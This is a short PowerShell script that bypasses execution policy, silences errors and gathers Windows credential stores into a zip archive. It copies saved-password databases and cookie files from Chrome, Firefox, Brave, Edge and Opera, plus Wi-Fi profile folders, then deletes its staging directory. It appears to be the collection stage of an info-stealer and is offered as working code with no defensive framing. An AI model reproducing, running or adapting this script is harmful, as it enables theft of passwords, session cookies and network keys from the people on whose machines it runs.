# Bypass execution policy and suppress errors
Set-ExecutionPolicy Bypass -Scope Process -Force 2>&1>$null
$ErrorActionPreference = "SilentlyContinue"

# Create a temporary directory to store collected files
$tempDir = "$env:USERPROFILE\TEMP\BrowserData_$(Get-Date -Format 'yyyyMMddHHmmss')"
New-Item -ItemType Directory -Path $tempDir | Out-Null

# Function to copy files if they exist
function Copy-BrowserFiles {
    param (
        [string]$browserName,
        [string[]]$paths
    )
    foreach ($path in $paths) {
        $resolvedPath = [System.Environment]::ExpandEnvironmentVariables($path)
        if (Test-Path $resolvedPath) {
            $destDir = "$tempDir\$browserName"
            New-Item -ItemType Directory -Path $destDir -Force | Out-Null
            Copy-Item -Path $resolvedPath -Destination $destDir -Recurse -Force
        }
    }
}

# Collect browser credentials
Copy-BrowserFiles "Chrome"  @("%LocalAppData%\Google\Chrome\User Data\Default\Login Data", "%LocalAppData%\Google\Chrome\User Data\Default\Network\Cookies")
Copy-BrowserFiles "Firefox" @( (Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "logins.json" -Recurse).FullName, (Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "key4.db" -Recurse).FullName )
Copy-BrowserFiles "Brave"   @("%LocalAppData%\BraveSoftware\Brave-Browser\User Data\Default\Login Data")
Copy-BrowserFiles "Edge"    @("%LocalAppData%\Microsoft\Edge\User Data\Default\Login Data")
Copy-BrowserFiles "Opera"   @("%AppData%\Opera Software\Opera Stable\Login Data")

# Collect Wi-Fi profiles
$wifiPath = "C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces"
if (Test-Path $wifiPath) {
    Copy-Item -Path $wifiPath -Destination "$tempDir\WifiProfiles" -Recurse -Force
}

# Compress
Compress-Archive -Path $tempDir -DestinationPath $env:USERPROFILE\TEMP\data.zip


# Cleanup temporary files (optional)
Remove-Item -Path $tempDir -Recurse -Force